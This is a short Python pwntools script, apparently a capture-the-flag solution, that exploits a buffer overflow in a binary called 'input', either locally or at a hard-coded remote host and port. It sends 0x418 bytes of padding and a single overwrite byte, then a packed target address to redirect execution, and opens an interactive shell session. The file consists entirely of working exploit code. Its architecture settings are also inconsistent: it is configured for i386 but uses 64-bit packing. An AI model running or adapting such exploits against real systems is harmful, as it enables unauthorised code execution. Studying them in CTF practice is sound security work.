from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./input"
HOST = "35.186.153.116"
PORT = 5001 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_target = 0x401253
addr_main = 0x4011b6
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#libc_binsh = next(libc.search("/bin/sh"))

def exploit():
	bufsize = 0x418 #0x418	
	payload = "B"*bufsize
	payload += "\x37"
	#payload += p64(addr_target)
	
	conn.send(payload)
	conn.send(p64(addr_target))
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
